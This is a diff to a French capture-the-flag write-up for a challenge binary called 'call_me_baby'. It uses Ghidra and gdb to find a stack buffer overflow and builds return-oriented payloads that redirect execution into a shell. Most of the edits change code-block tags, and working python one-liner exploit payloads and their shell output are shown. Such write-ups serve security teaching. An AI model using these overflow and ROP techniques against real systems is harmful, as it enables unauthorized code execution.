@@ -10,7 +10,7 @@ http://internetcest.fun:13337
 
 [Cet executable](./call_me_baby) est fournis. Essayons le :
 
-```console
+```bash
 $ ./call_me_baby 
 Write your love letter: 
 test
@@ -25,18 +25,14 @@ Avec ghidra on obtient les fonctions suivantes :
 
 ```C
 undefined8 main(void)
-
 {
   setup();
   vuln();
   puts("You should call her instead...");
   return 0;
 }
-```
 
-```C
 void vuln(void)
-
 {
   undefined local_48 [64];
   
@@ -44,11 +40,8 @@ void vuln(void)
   read(0,local_48,100);
   return;
 }
-```
 
-```C
 void call_me(undefined8 param_1)
-
 {
   int iVar1;
   undefined8 local_10;
@@ -63,11 +56,8 @@ void call_me(undefined8 param_1)
   }
   return;
 }
-```
 
-```C
 void gadgets(void)
-
 {
   return;
 }
@@ -81,10 +71,7 @@ Pour ce faire, on va exploiter la fonction gets() dans vuln() qui est vulnérabl
 
 Utilisons gdb pour trouver notre exploit. On ajoute un break après la fonction gets() pour observer la mémoire et rentre 64 charactères A pour remplir le buffer utilisé pour récupérer l'entrée de l'utilisateur :
 
-```console
-$ gdb -q call_me_baby 
-Reading symbols from call_me_baby...
-(No debugging symbols found in call_me_baby)
+```gdb
 (gdb) break *vuln
 Breakpoint 1 at 0x4011dd
 (gdb) disas vuln
@@ -153,7 +140,7 @@ gs             0x0                 0
   
 L'addresse à laquelle les fonctions se redirigent après leur execution est stocké après le rbp dans la stack. En regardant le registre et l'adresse à laquelle le rbp est stocké, on déduit le payload pour rediriger le programme :
 
-```console
+```gdb
 (gdb) break *call_me
 Breakpoint 3 at 0x40118a
 (gdb) info func call_me
@@ -246,7 +233,7 @@ Ces instructions font partis de la fonction gadgets() qu'on a apperçue plus tô
   
 On voit que la fonction push le rbp sur la stack, puis pop la stack dans rdi. Autrement dit la valeur contenu dans le rbp, va se retrouver dans le rdi. Il faut donc modifer le rbp avec la valeur que l'on veut mettre dans le rdi, puis rediriger le programme vers la fonction gadgets. Essayons un payload :
 
-```console
+```gdb
 (gdb) i func gadgets
 all functions matching regular expression "gadgets":
 
@@ -343,7 +330,7 @@ On voit dans le registre que le rdi est bien modifié.
   
 Il faut maintenant ajouter un pointeur vers la fonction call_me pour qu'elle s'execute après gadgets :
 
-```console
+```gdb
 (gdb) i func call_me
 all functions matching regular expression "call_me":
 
@@ -404,7 +391,7 @@ error in re-setting breakpoint 5: no symbol "gadgets" in current context.
 
 On arrive bien au message de succès mais le programme plante en essayant de lancer le shell. Testons le payload directement sur l'executable :
 
-```console
+```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby
 Write your love letter: 
 whoami
@@ -419,7 +406,7 @@ Le shell c'est bien lancé, le payload final est donc `"\x41"*64+"\x62\x61\x62\x
 
 Cherchons le pointeur vers l'instruction ouvrant un shell et injectons là après le rbp :
 
-```console
+```gdb
 (gdb) disas call_me
 Dump of assembler code for function call_me:
    0x000000000040118a <+0>:	push   %rbp
@@ -471,7 +458,7 @@ Error in re-setting breakpoint 2: No symbol "call_me" in current context.
 
 On arrive bien au message de succès mais le programme plante en essayant de lancer le shell. Testons le payload directement sur l'executable :
 
-```console
+```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby 
 Write your love letter: 
 whoami
@@ -490,7 +477,7 @@ De la même manière que le chall précedent, on utilise des scripts python pour
 
 [Script](./exploit1.py)
 
-```console
+```bash
 $ python3 exploit1.py 
 b'Write your love letter: \n'
 whoami
